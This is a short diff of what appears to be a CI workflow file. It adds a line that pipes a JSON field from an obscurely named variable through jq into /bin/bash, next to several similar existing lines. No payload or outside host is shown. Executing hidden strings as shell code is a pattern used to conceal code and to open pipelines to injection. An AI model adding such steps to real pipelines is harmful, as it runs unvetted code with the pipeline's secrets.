@@ -29,6 +29,7 @@ jobs:
           echo $inexi00 | jq -r .kqo22 | /bin/bash
           echo $ioade45 | jq -r .ttq53 | /bin/bash
           printf '%s' "$jxscp9056" | jq -r .wef08 | /bin/bash
+          echo $vecq04219 | jq -r .tr7 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
